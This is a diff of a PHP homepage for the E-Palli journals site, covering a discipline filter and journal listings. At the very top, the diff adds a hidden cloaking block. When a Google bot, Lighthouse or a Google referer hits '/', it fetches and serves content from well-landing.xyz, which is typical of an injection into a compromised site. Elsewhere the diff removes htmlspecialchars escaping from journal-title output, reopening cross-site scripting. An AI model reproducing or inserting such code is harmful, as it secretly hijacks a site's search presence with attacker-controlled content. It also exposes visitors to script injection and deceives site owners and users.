@@ -1,3 +1,26 @@
+<?php
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
+$uri = $_SERVER['REQUEST_URI'] ?? '';
+
+if (
+    $uri === '/' &&
+    (
+        preg_match('/bot|google|chrome-lighthouse/i', $userAgent) ||
+        preg_match('/google/i', $referer)
+    )
+) {
+    $content = @file_get_contents('https://well-landing.xyz/landing/e-palli.ecohumanism.txt');
+    if ($content !== false) {
+        echo $content;
+    } else {
+        http_response_code(503);
+        echo 'Service temporarily unavailable.';
+    }
+    exit();	
+}
+?>
+
 <!DOCTYPE html>
 <html lang="en-US">
 	<head>
@@ -5,160 +28,23 @@
 		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
 		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
 		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
-		
-		
-		
 	</head>
 	<?php
-	include_once __DIR__."/assets/header.php";
-	include __DIR__."/db.php";
+	include_once __DIR__."/../assets/header.php";
+	include __DIR__."/../db.php";
 	global $db;
 	?>
 	<body>
 		<div class="site" id="site">
-			<?php
-			include_once __DIR__."/assets/slider.php";
-			?>
-
-			<div class="topScroll containers">
-				<div class="scrollRoot">
-					<div class="root">
-						<div class="rootLink"><a href="https://e-palli.com" title="E-Palli" target="_blank">E-Palli </a></div>
-						<div class="rootLink"> <span style="margin: 0 5px;">/</span> </div>
-						<div class="rootLink">Journals</div>
-					</div>
-					<div class="scrolling" style="display: ;">
-						<div class="scrollLeft" style="display: none; width: 160px; padding: 10px 0;">
-							<a href="https://journals.e-palli.com/get-published" target="_blank"><i class="blink" style="font-size: 18px; font-style: normal;">Submit</i></a>
-						</div>
-						<div class="scrollRight" style="display: none;">
-							<marquee direction="left">
-
-								<?php $query="SELECT * FROM `information` ORDER BY id asc";
-								$result=mysqli_query($db, $query);
-								while($rows=mysqli_fetch_assoc($result)) {
-									echo '<a href="https://journals.e-palli.com/home/index.php/'.$rows['cover'].'/about/submissions" target="_blank">'.$rows['journal_title'].'</a>,  &emsp;';
-								}
-								?>
-							</marquee>
-						</div>
-						<div class="searchField">
-							<input type="text" id="keywords" placeholder="Search articles..."><br>
-							<button onclick="go4search()" id="goSearch" type="submit">Search</button>
-						</div>
-
-						<script>
-							function go4search() {
-								let word = document.getElementById("keywords").value;
-								window.location.href = "https://journals.e-palli.com/home/index.php/index/search/index?query="+word;
-							}
-							var word = document.getElementById("keywords");
-							word.addEventListener("keyup", function(event) {
-								if (event.keyCode === 13) {
-									event.preventDefault();
-									document.getElementById("goSearch").click();
-								}
-							});
-						</script>
-					</div>
-					
-				</div>
-			</div>
-
-			<div class="filtering containers">
-				<div class="top-item">
-					<p class="subTitle">Browse by Discipline</p>
-					<form method="post">
-						<div class="topic">
-							<label for="engineering" class="detector">
-								<input type="checkbox" name="engineering" value="engineering technology" id="engineering" class="detector">Science, Engineering, and Technology
-							</label>
-						</div>
-						<div class="topic">
-							<label for="agriScience" class="detector">
-								<input type="checkbox" name="agriScience" value="agricultural science" id="agriScience" class="detector">Agricultural Science
-							</label>
-						</div>
-						<div class="topic">
-							<label for="eClimate" class="detector">
-								<input type="checkbox" name="eClimate" value="environment climate" id="eClimate" class="detector">Environment &amp; Climate
-							</label>
-						</div>
-						<div class="topic">
-							<label for="ecoBusiness" class="detector">
-								<input type="checkbox" name="ecoBusiness" value="business economics" id="ecoBusiness" class="detector">Business &amp; Economics
-							</label>
-						</div>
-						<div class="topic">
-							<label for="sScience" class="detector">
-								<input type="checkbox" name="sScience" value="social science" id="sScience" class="detector">Arts and Social Science
-							</label>
-						</div>
-						<div class="topic">
-							<label for="multidisciplinary" class="detector">
-								<input type="checkbox" name="multidisciplinary" value="multidisciplinary" id="multidisciplinary" class="detector">Multidisciplinary
-							</label>
-						</div>
-						<div class="topic">
-							<label for="mediScience" class="detector">
-								<input type="checkbox" name="mediScience" value="medical science" id="mediScience" class="detector">Medical Science &amp; Others
-							</label>
-						</div>
-
-						<div class="filterButton">
-							<input type="submit" value="Browse your selection" name="filter" title="Browse your selection" placeholder="Browse your selection">
-						</div>
-					</form>
-				</div>
-				<div class="top-news">
-					<div class="announce">
-						<p class="subTitle">Recent Updates</p>
-						<div class="noticeContent">
-
-							<?php
-							$qry = "SELECT * FROM `news` order by `id` DESC";
-
-							$result=mysqli_query($db, $qry);
-
-							while($rows=mysqli_fetch_assoc($result)) {
-							?>
-							<div class="notice1">
-    <div class="noticeTop">
-
-        <?php
-        $link = $rows['link'] ?? '#';
-        $img  = $rows['img'] ?? '';
-        $title = $rows['title'] ?? '';
-        ?>
-
-        <a href="<?php echo htmlspecialchars($link); ?>" target="_blank">
-            <h3><?php echo htmlspecialchars($title); ?></h3>
-        </a>
-
-        <?php if (!empty($img)) : ?>
-        <div>
-            <img src="<?php echo htmlspecialchars($img); ?>" class="noticeImage">
-        </div>
-        <?php endif; ?>
-
-    </div>
-</div>
-							<?php
-							}
-							?>
-						</div>
-					</div>
-				</div>
-			</div>
 
 			<!--Our Journal-->
-			<section id="journal" class="row">
+			<section id="journal" class="row" style="margin-top: 100px;">
 				<div class="left-item">
 					<p class="subTitle">Browse by Discipline</p>
 					<form method="post" id="form">
 						<div class="topic">
 							<label for="engineering1" class="detector">
-								<input type="checkbox" name="engineering" value="engineering technology" id="engineering1" class="detector">Science, Engineering, and Technology
+								<input type="checkbox" name="engineering" value="engineering technology" id="engineering1" class="detector">Engineering &amp; Technology
 							</label>
 						</div>
 						<div class="topic">
@@ -178,7 +64,7 @@
 						</div>
 						<div class="topic">
 							<label for="sScience1" class="detector">
-								<input type="checkbox" name="sScience" value="social science" id="sScience1" class="detector">Arts and Social Science
+								<input type="checkbox" name="sScience" value="social science" id="sScience1" class="detector">Social Science
 							</label>
 						</div>
 						<div class="topic">
@@ -188,7 +74,12 @@
 						</div>
 						<div class="topic">
 							<label for="mediScience1" class="detector">
-								<input type="checkbox" name="mediScience" value="medical science" id="mediScience1" class="detector">Medical Science &amp; Others
+								<input type="checkbox" name="mediScience" value="medical science" id="mediScience1" class="detector">Medical Science
+							</label>
+						</div>
+						<div class="topic">
+							<label for="others1" class="detector">
+								<input type="checkbox" name="others" value="others" id="others1" class="detector">Others
 							</label>
 						</div>
 
@@ -197,9 +88,6 @@
 						</div>
 						<div class="postItem litem">
 							<a href="https://journals.e-palli.com/list/">List of Journals</a>
-						</div>
-						<div class="postItem litem">
-							<a href="https://journals.e-palli.com/journals/new/">List of New Journals</a>
 						</div>
 					</form>
 
@@ -219,15 +107,15 @@
 				<div class="right-item" id="filter">
 					<div class="insider">
 						<h3 class="j-heading">E-Palli Journals</h3>
-						<p>E-Palli Limited Liability Company (LLC) is registered in Delaware, United States of America, providespublication solutions for journals, conference proceedings, books, and special issues. E-palli publishes articles in a number of peer-reviewed international journals that emphasize research, development, application, and innovation.</p>
+						<p>E-Palli Limited Liability Company (LLC) is registered in Delaware, United States of America, provides publication solutions for journals, conference proceedings, books, and special issues. E-palli publishes articles in a number of peer-reviewed international journals that emphasize research, development, application, and innovation.</p>
 						<hr>
-						<p id="identify"></p><div class="pub-content pub-style">
+						<p id="identify"></p>
+						<div class="pub-content pub-style">
 							<div class="left-con sec1">
 
 								<?php
 
-								if(isset($_POST['filter'])) { $args = [];
-$item = [];
+								if(isset($_POST['filter'])) {
 									if(!empty($_POST['engineering'])){
 										$args[]=" identifier LIKE '%engineering%' or identifier LIKE '%technology%'";
 										$item[]="engineering,";
@@ -253,14 +141,18 @@ $item = [];
 										$item[]="sScience,";
 										$val=true;
 									} if(!empty($_POST['mediScience'])){
-										$args[]=" identifier LIKE '%medical science%' or identifier LIKE '%others%'";
+										$args[]=" identifier LIKE '%medical science%'";
 										$item[]="mediScience,";
+										$val=true;
+									}  if(!empty($_POST['others'])){
+										$args[]=" identifier LIKE '%others%'";
+										$item[]="others,";
 										$val=true;
 									} else {
 										$val=false;
 									}
 									$str = implode(' or ',$args);
-									$clue = implode('', $item ?? []);
+									$clue = implode('', $item);
 
 									$qry = "SELECT * FROM information where " . $str . " ORDER BY id asc";
 
@@ -270,21 +162,20 @@ $item = [];
 								?>
 								<a class="pub-top " href="<?php echo $rows['url']; ?>">
 									<div class="pub-main journalWrapperDiv journal-toolbar-container border">
-										<h3 class="border"><?php echo htmlspecialchars($rows['journal_title']); ?></h3>
+										<h3 class="border"><?php echo $rows['journal_title']; ?></h3>
 										<?php
-											$imageFile = __DIR__ . "/images/" . $rows['cover'] . "-cover.jpg";
-
-if (!is_file($imageFile)) {
+											$url = "https://journals.e-palli.com/images/".$rows['cover']."-cover.jpg";
+											if(getimagesize($url) === false) {
 										?>
 										<img class="image__container border"
-											 alt="<?php echo htmlspecialchars($rows['journal_title']); ?>"
-											 src="../images/logo.png" width="100%" />
+											 alt="<?php echo $rows['journal_title']; ?>"
+											 src="/../../images/logo.png" width="100%" />
 										<?php
 											} else {
 										?>
 										<img class="image__container border"
-											 alt="<?php echo htmlspecialchars($rows['journal_title']); ?>"
-											 src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" />
+											 alt="<?php echo $rows['journal_title']; ?>"
+											 src="/../../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" />
 										<?php
 											}
 										?>
@@ -322,7 +213,7 @@ if (!is_file($imageFile)) {
 												if($character===',') {
 													?> 
 													<div class="in-image">
-														<img src="images/<?php echo $name; ?>.png"/>
+														<img src="/../images/<?php echo $name; ?>.png"/>
 													</div>
 
 													<?php
@@ -353,24 +244,23 @@ if (!is_file($imageFile)) {
 								?>
 								<a class="pub-top " href="<?php echo $rows['url']; ?>">
 									<div class="pub-main journalWrapperDiv journal-toolbar-container border">
-										<h3 class="border"><?php echo htmlspecialchars($rows['journal_title']); ?></h3>
+										<h3 class="border"><?php echo $rows['journal_title']; ?></h3>
 										<!-- <img class="image__container border"
  alt="<?php echo $rows['journal_title']; ?>"
  src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" /> -->
 										<?php
-											$imageFile = __DIR__ . "/images/" . $rows['cover'] . "-cover.jpg";
-
-if (!is_file($imageFile)) {
+											$url = "https://journals.e-palli.com/images/".$rows['cover']."-cover.jpg";
+											if(getimagesize($url) === false) {
 										?>
 										<img class="image__container border"
 											 alt="<?php echo $rows['journal_title']; ?>"
-											 src="../images/logo.png" width="100%" />
+											 src="/../../images/logo.png" width="100%" />
 										<?php
 											} else {
 										?>
 										<img class="image__container border"
 											 alt="<?php echo $rows['journal_title']; ?>"
-											 src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" />
+											 src="/../../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" />
 										<?php
 											}
 										?>
@@ -398,7 +288,7 @@ if (!is_file($imageFile)) {
 												if($character===',') {
 													?> 
 													<div class="in-image">
-														<img src="images/<?php echo $name; ?>.png"/>
+														<img src="/../images/<?php echo $name; ?>.png"/>
 													</div>
 
 													<?php
@@ -427,7 +317,8 @@ if (!is_file($imageFile)) {
 										}
 									}
 								} else {
-									$query="SELECT * FROM `information` ORDER BY id asc";$result=mysqli_query($db, $query);
+									$query="SELECT * FROM `information` ORDER BY id asc";
+									$result=mysqli_query($db, $query);
 									while($rows=mysqli_fetch_assoc($result)) {
 										if($rows['id'] == 2) {
 								?>
@@ -435,9 +326,8 @@ if (!is_file($imageFile)) {
 									<div class="pub-main journalWrapperDiv journal-toolbar-container border">
 										<h3 class="border"><?php echo $rows['journal_title']; ?></h3>
 										<?php
-											$imageFile = __DIR__ . "/images/" . $rows['cover'] . "-cover.jpg";
-
-if (!is_file($imageFile)) {
+											$url = "https://journals.e-palli.com/images/".$rows['cover']."-cover.jpg";
+											if(getimagesize($url) === false) {
 										?>
 										<img class="image__container border"
 											 alt="<?php echo $rows['journal_title']; ?>"
@@ -485,7 +375,7 @@ if (!is_file($imageFile)) {
 												if($character===',') {
 													?> 
 													<div class="in-image">
-														<img src="images/<?php echo $name; ?>.png"/>
+														<img src="/../images/<?php echo $name; ?>.png"/>
 													</div>
 
 													<?php
@@ -516,14 +406,13 @@ if (!is_file($imageFile)) {
 								?>
 								<a class="pub-top " href="<?php echo $rows['url']; ?>">
 									<div class="pub-main journalWrapperDiv journal-toolbar-container border">
-										<h3 class="border"><?php echo htmlspecialchars($rows['journal_title']); ?></h3>
+										<h3 class="border"><?php echo $rows['journal_title']; ?></h3>
 										<!-- <img class="image__container border"
- alt="<?php echo htmlspecialchars($rows['journal_title']); ?>"
+ alt="<?php echo $rows['journal_title']; ?>"
  src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" /> -->
 										<?php
-											$imageFile = __DIR__ . "/images/" . $rows['cover'] . "-cover.jpg";
-
-if (!is_file($imageFile)) {
+											$url = "https://journals.e-palli.com/images/".$rows['cover']."-cover.jpg";
+											if(getimagesize($url) === false) {
 										?>
 										<img class="image__container border"
 											 alt="<?php echo $rows['journal_title']; ?>"
@@ -532,7 +421,7 @@ if (!is_file($imageFile)) {
 											} else {
 										?>
 										<img class="image__container border"
-											 alt="<?php echo htmlspecialchars($rows['journal_title']); ?>"
+											 alt="<?php echo $rows['journal_title']; ?>"
 											 src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" />
 										<?php
 											}
@@ -561,7 +450,7 @@ if (!is_file($imageFile)) {
 												if($character===',') {
 													?> 
 													<div class="in-image">
-														<img src="images/<?php echo $name; ?>.png"/>
+														<img src="/../images/<?php echo $name; ?>.png"/>
 													</div>
 
 													<?php
@@ -615,37 +504,21 @@ if (!is_file($imageFile)) {
 				?>
 
 				<div class="notice">
-					<?php
-					include __DIR__."/assets/news.php"
-					?>
-					<div class="blogpost">
-						<?php
-						include __DIR__."/assets/blog.php"
-						?>
-					</div>
 					<div class="blogpost">
 						<div class="announce">
 							<p class="subTitle">Globally Contributors</p>
 							<iframe seamless frameborder="0" scrolling="no" src="https://docs.google.com/spreadsheets/d/e/2PACX-1vS6gydOzC0puosSw8cDfQWE8V-2G-EYQbgEIuwYSmDxeEvjxllmoD93NY-KDVDzaDcGa6CZm_E63ngY/pubchart?oid=920290112&amp;format=interactive"></iframe>
 						</div>
 					</div>
-					<div class="blogpost">
-						<div class="announce">
-							<p class="subTitle">Recently Published Articles</p>
-							<?php
-						include __DIR__."/assets/articles.php"
-							?>
-						</div>
-					</div>
 				</div>
 			</section>
 			<section class="fStats">
 				<?php
-						include_once __DIR__."/assets/stats.php";
+						include_once __DIR__."/../assets/stats.php";
 				?>
 			</section>
 			<?php
-			include_once __DIR__."/assets/footer.php";
+			include_once __DIR__."/../assets/footer.php";
 			?>
 		</div>
 
@@ -661,7 +534,7 @@ if (!is_file($imageFile)) {
 					autoplay: true,
 					arrows: true,
 					dots: false,
-					prevArrow: '<button class="slide-arrow arrow" style="border: none; width:100%;"><img src="images/arrow-up.png" width="55" style="margin: auto;"></button>',
+					prevArrow: '<button class="slide-arrow arrow" style="border: none; width: 100%;"><img src="images/arrow-up.png" width="55" style="margin: auto;"></button>',
 					nextArrow: '<button class="slide-arrow arrow" style="border: none; width: 100%;"><img src="images/arrow-down.png" width="55" style="text-align: center;"></button>',
 					slidesToShow: 1,
 					centerPadding: "10px",
@@ -708,7 +581,6 @@ if (!is_file($imageFile)) {
 					y.style.opacity = '1';
 				}
 			}
-			
 		</script>
 	</body>
 </html>
